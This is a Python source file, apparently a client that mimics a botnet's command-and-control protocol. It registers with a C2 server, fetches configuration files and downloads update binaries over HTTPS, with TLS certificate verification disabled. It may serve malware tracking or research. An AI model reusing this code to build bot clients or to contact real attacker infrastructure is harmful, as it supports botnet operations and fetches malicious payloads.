import requests
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class C2:
    def __init__(self, client, server):
        self.client = client
        self.server = server

    @staticmethod
    def random_str():
        str_len = random.randrange(0, 17) + 16
        rand_str = ''

        for i in range(0, str_len):
            char = random.randrange(0, 62)

            if char >= 52:
                char -= 4
            elif char >= 26:
                char += 71
            else:
                char += 65

            rand_str += chr(char)

        return rand_str

    def contact_c2(self, path):
        url = 'https://{0}{1}'.format(self.server, path)

        try:
            result = requests.get(url, verify=False, timeout=4)
        except requests.exceptions.ConnectionError:
            return -1, None

        return result.status_code, result.content

    @staticmethod
    def parse_complex_response(response):
        code, data = response

        if code != 200:
            return response

        params = data.split('/', 6)
        encrypted_len = int(params[5])
        encrypted_len += 2
        return code, params[6][2:encrypted_len]

    def register(self):
        client = self.client
        path = '/{0}/{1}/0/{2}/{3}/'.format(client.campaign, client.computer_id,
                                            client.reg_str, self.random_str())
        c2_response = self.contact_c2(path)
        return self.parse_complex_response(c2_response)

    def get_file(self, config_name):
        client = self.client
        path = '/{0}/{1}/5/{2}/'.format(client.campaign, client.computer_id, config_name)

        return self.contact_c2(path)

    def get_main_config(self):
        client = self.client
        path = '/{0}/{1}/23/{2}/'.format(client.campaign, client.computer_id, self.client.config['config_id'])

        c2_response = self.contact_c2(path)
        return self.parse_complex_response(c2_response)

    def get_update_binary(self):
        client = self.client
        path = '/{0}/{1}/25/{2}//'.format(client.campaign, client.computer_id,  self.random_str())
        c2_response = self.contact_c2(path)
        return c2_response
